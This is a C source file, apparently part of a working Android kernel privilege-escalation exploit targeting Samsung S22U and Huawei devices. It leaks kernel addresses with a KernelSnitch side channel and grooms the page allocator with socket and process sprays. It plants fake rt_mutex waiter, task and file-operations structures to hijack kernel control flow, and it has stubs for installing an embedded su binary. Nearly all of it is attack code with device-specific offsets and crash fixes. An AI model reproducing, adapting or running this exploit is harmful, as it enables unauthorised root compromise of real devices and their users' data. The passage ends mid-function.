#include "common.h"
#include "buddyinfo.h"
#include "fd_budget.h"
#include "kernelsnitch/kernelsnitch.h"

#ifndef RECLAIM_ORDER0_MB_DEFAULT
#define RECLAIM_ORDER0_MB_DEFAULT 16
#endif
#ifndef RECLAIM_ABSORB_TARGET_DEFAULT
#define RECLAIM_ABSORB_TARGET_DEFAULT 0
#endif
#ifndef RECLAIM_ABSORB_MAX_PAGES_DEFAULT
#define RECLAIM_ABSORB_MAX_PAGES_DEFAULT 16384
#endif
#ifndef ORDER3_HOLD_PAIRS_MAX
#define ORDER3_HOLD_PAIRS_MAX 2048
#endif

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[SKB_RECLAIM_PAIRS][2];
static int reclaim_sv_inited;

static void init_reclaim_sv(void) {
  if (reclaim_sv_inited) {
    return;
  }
  for (int p = 0; p < SKB_RECLAIM_PAIRS; p++) {
    reclaim_sv[p][0] = -1;
    reclaim_sv[p][1] = -1;
  }
  reclaim_sv_inited = 1;
}
static int (*order3_hold_sv)[2];
static int order3_hold_cap;
static int order3_hold_pairs;
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* SCHED_BATCH changes class so rt_mutex_adjust_prio_chain actually walks. */
  attr.sched_policy = SCHED_BATCH;
#else
  attr.sched_policy = SCHED_BATCH;
#endif
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* owner stays 0.  .llseek is sacrificed by the one-child erase
   * (__rb_change_child else -> fake_fops+0x08) and repaired after CFI. */
  put64(p, off + FOPS_LLSEEK_OFF, 0);
#else
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
#endif
#ifdef CONFIGFS_USE_FILE_RW
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
#else
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
#endif
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

void probe_ashmem_ioctl(const char *tag, int fd) {
  int opened = 0;
  int open_errno = 0;
  if (fd < 0) {
    errno = 0;
    fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
    open_errno = errno;
    opened = 1;
  }
  int ioctl_ret = -1;
  int ioctl_errno = 0;
  if (fd >= 0) {
    char name[ASHMEM_NAME_LEN];
    memset(name, 'A', sizeof(name) - 1);
    name[sizeof(name) - 1] = 0;
    errno = 0;
    ioctl_ret = ioctl(fd, ASHMEM_SET_NAME, name);
    ioctl_errno = errno;
  }
  pr_info("ashmem probe %s open_fd=%d open_errno=%d ioctl_ret=%d ioctl_errno=%d "
          "want_ioctl=%016zx table=%016zx\n",
          tag, fd, open_errno, ioctl_ret, ioctl_errno,
          text_addr(ASHMEM_IOCTL), fake_fops);
  if (opened && fd >= 0) {
    close(fd);
  }
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

static int reclaim_env_int(const char *name, int def, int min, int max) {
  const char *arg = getenv(name);
  char *end = NULL;
  long value;

  if (!arg || !*arg) {
    return def;
  }
  errno = 0;
  value = strtol(arg, &end, 0);
  if (errno || !end || *end || value < min || value > max) {
    pr_warning("bad %s value=%s; using %d\n", name, arg, def);
    return def;
  }
  return (int)value;
}

static void prefill_order0_buddy(void) {
  size_t len =
      (size_t)reclaim_env_int("RECLAIM_ORDER0_MB", RECLAIM_ORDER0_MB_DEFAULT, 1,
                              256)
      << 20;
  unsigned char *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (p == MAP_FAILED) {
    pr_warning("order0 prefill mmap failed errno=%d\n", errno);
    return;
  }
  for (size_t off = 0; off < len; off += PAGE_SIZE) {
    p[off] = 0;
  }
  munmap(p, len);
  pr_info("mm order0 prefill bytes=%zu\n", len);
}

static void order3_hold_end(void) {
  if (!order3_hold_sv) {
    return;
  }
  for (int p = 0; p < order3_hold_pairs; p++) {
    for (int i = 0; i < 2; i++) {
      if (order3_hold_sv[p][i] >= 0) {
        close(order3_hold_sv[p][i]);
        order3_hold_sv[p][i] = -1;
      }
    }
  }
  order3_hold_pairs = 0;
  free(order3_hold_sv);
  order3_hold_sv = NULL;
  order3_hold_cap = 0;
}

static int order3_hold_grow(void) {
  int cap = order3_hold_cap ? order3_hold_cap : 256;
  int (*next)[2];
  if (order3_hold_pairs < order3_hold_cap) {
    return 1;
  }
  if (cap > ORDER3_HOLD_PAIRS_MAX / 2) {
    cap = ORDER3_HOLD_PAIRS_MAX;
  } else {
    cap *= 2;
  }
  if (cap > ORDER3_HOLD_PAIRS_MAX) {
    cap = ORDER3_HOLD_PAIRS_MAX;
  }
  if (order3_hold_pairs >= cap) {
    return 0;
  }
  next = realloc(order3_hold_sv, (size_t)cap * sizeof(*next));
  if (!next) {
    return 0;
  }
  for (int p = order3_hold_cap; p < cap; p++) {
    next[p][0] = -1;
    next[p][1] = -1;
  }
  order3_hold_sv = next;
  order3_hold_cap = cap;
  return 1;
}

static void order3_hold_begin(const struct msghdr *msg) {
  long target = reclaim_env_int("RECLAIM_ABSORB_TARGET",
                                RECLAIM_ABSORB_TARGET_DEFAULT, 0, 64);
  long max_pages = reclaim_env_int("RECLAIM_ABSORB_MAX_PAGES",
                                   RECLAIM_ABSORB_MAX_PAGES_DEFAULT, 0, 65536);
  long free3 = buddyinfo_order3_free();
  long before = free3;
  long pages = 0;
  int skbs = 0;

  /* Unreadable /proc/buddyinfo (free3 < 0) absorbs to the cap, matching
   * S22U: without a count the list cannot be shown empty, so fill it. */
  if (free3 < 0) {
    pr_info("mm order3 absorb: buddyinfo unreadable, filling to cap\n");
  }
  while (pages < max_pages) {
    if (free3 >= 0 && free3 <= target) {
      break;
    }
    if (!order3_hold_grow()) {
      break;
    }
    int p = order3_hold_pairs;
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, order3_hold_sv[p]) != 0) {
      break;
    }
    order3_hold_pairs++;
    int sent = 0;
    for (int i = 0; i < 3; i++) {
      if (sendmsg(order3_hold_sv[p][0], msg, MSG_DONTWAIT) <= 0) {
        break;
      }
      sent++;
    }
    if (!sent) {
      close(order3_hold_sv[p][0]);
      close(order3_hold_sv[p][1]);
      order3_hold_sv[p][0] = -1;
      order3_hold_sv[p][1] = -1;
      order3_hold_pairs--;
      break;
    }
    skbs += sent;
    /* Huawei unix_stream cap is one order-3 frag per skb (SKB_SEND_SIZE). */
    pages += (long)sent;
    free3 = buddyinfo_order3_free();
  }
  pr_info("mm order3 absorb: pairs=%d skbs=%d free3 %ld -> %ld (target=%ld)\n",
          order3_hold_pairs, skbs, before, free3, target);
}

void close_reclaim_sockets(void) {
  if (reclaim_sv_inited) {
    for (int p = 0; p < SKB_RECLAIM_PAIRS; p++) {
      for (int i = 0; i < 2; i++) {
        if (reclaim_sv[p][i] >= 0) {
          close(reclaim_sv[p][i]);
          reclaim_sv[p][i] = -1;
        }
      }
    }
    reclaim_sv_inited = 0;
  }
  order3_hold_end();
}

void release_absorb_sockets(void) {
  int pairs = order3_hold_pairs;
  order3_hold_end();
  pr_info("released absorb sockets pairs=%d\n", pairs);
}

int count_open_fds(int limit) {
  int n = 0;
  int max_fd = limit > 0 ? limit : 4096;
  for (int fd = 0; fd < max_fd; fd++) {
    if (fcntl(fd, F_GETFD) != -1) {
      n++;
    }
  }
  return n;
}

int ensure_pipe_fd_budget(void) {
  struct rlimit r;
  int pipes = PIPE_PHYS_PIPE_COUNT;
  int slack = FD_BUDGET_SLACK;
  int open_n;
  int limit;

  if (getrlimit(RLIMIT_NOFILE, &r) != 0) {
    pr_warning("pipe fd budget getrlimit errno=%d\n", errno);
    return 0;
  }
  if (r.rlim_cur < r.rlim_max) {
    r.rlim_cur = r.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &r) != 0) {
      pr_warning("pipe fd budget setrlimit errno=%d\n", errno);
    } else if (getrlimit(RLIMIT_NOFILE, &r) != 0) {
      pr_warning("pipe fd budget getrlimit after raise errno=%d\n", errno);
    }
  }

  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }

  limit = (int)r.rlim_cur;
  open_n = count_open_fds(limit);
  pr_info("pipe fd budget open=%d limit=%d pipes=%d slack=%d room=%d\n",
          open_n, limit, pipes, slack,
          fd_budget_has_room(open_n, limit, pipes, slack));
  return fd_budget_has_room(open_n, limit, pipes, slack);
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

uintptr_t page_struct_to_direct(uintptr_t page) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* Inverse of copy_page_to_iter wrap; same on device and QEMU. */
  return qemu_wrap_page_to_linear(page);
#elif defined(QEMU_LAYOUT)
  return qemu_wrap_page_to_linear(page);
#else
  return device_page_to_linear(page);
#endif
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  pr_info("skb payload base=%016zx delta=%lld lock=%016zx w0=%016zx fops=%016zx\n",
          base, (long long)SKB_DATA_DELTA, fake_lock, fake_w0, fake_fops);
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* S22U one-child leftover is the erased node, not fake_w0. */
  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = 0;
  uintptr_t write_left = text_addr(ASHMEM_MISC_FOPS);
#else
  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
#endif
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }
#ifdef PSELECT_WAITER_LAYOUT_5_10
  else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /* S22U: leftover.task = fake_task so post-enqueue
     * wake_up_process bails on __state==0. Dummy w0 matches. */
    waiter_task = fake_task;
  }
  (void)write_pc;
  (void)write_right;
  (void)write_left;
#endif

#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* One order-3 frag: payload bytes start at the unix skb head size. */
  for (size_t chunk = 0; chunk < ORDER3_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + SKB_FRAG_BIAS + chunk;
#else
  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
#endif

    put32(p, LOCK_OFF + 0x00, 0);
#ifdef PSELECT_WAITER_LAYOUT_5_10
    /* Empty waiters tree: leftover is the erased node, not a waiter
     * already linked under fake_lock. */
    put64(p, LOCK_OFF + 0x08, 0);
    put64(p, LOCK_OFF + 0x10, 0);
    put64(p, LOCK_OFF + 0x18, 0);
#else
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }
#endif

#ifdef PSELECT_WAITER_LAYOUT_5_10
    /* Dummy waiter only.  The leftover overlay is the erased node. */
    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put64(p, W0_OFF + 0x18, 0);
    put64(p, W0_OFF + 0x20, 0);
    put64(p, W0_OFF + 0x28, 0);
    put64(p, W0_OFF + 0x30, waiter_task);
    put64(p, W0_OFF + 0x38, fake_lock);
    put32(p, W0_OFF + 0x48, FAKE_WAITER_PRIO);
#else
    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
#endif

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
    /*
     * Device adaptation (required, verified statically in this image).
     * try_to_wake_up() prologue, decoded at file offset 0x131884:
     *   +0x44  cmp                                  ; p->state & state
     *   +0x4c  b.<cond> <unlock>                    ; state test FAILS -> skip
     *   +0x50  ldr/str  [x25, #0x4b8]               ; woken counter
     *   +0x60  add   x8, x19, #0x9d0                ; vendor pointer
     *   +0x64  ldar  x8, [x8]
     *   +0x68  ldr   x8, [x8, #0x8]                 ; faults at 0x8 if NULL
     *   +0x6c  cbz   x8, <vendor bail-out>
     * So the deref happens AFTER the state test passes, not before.  On the
     * 5.10 FOPS branch waiter_task == fake_task, and our planted page has
     * zero at +0x9d0, so taking that path faults at address 0x8 -- exactly
     * the recorded oops ("pc: try_to_wake_up+0x68, addr 0x8").  Point the
     * field at fake_task itself: fake_task+8 stays zero and the cbz at
     * +0x6c takes the bail-out.
     */
    put64(p, FAKE_TASK_OFF + 0x9d0, fake_task);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  int ks_verbose = getenv("KERNELSNITCH_VERBOSE") &&
                   getenv("KERNELSNITCH_VERBOSE")[0] != '0';
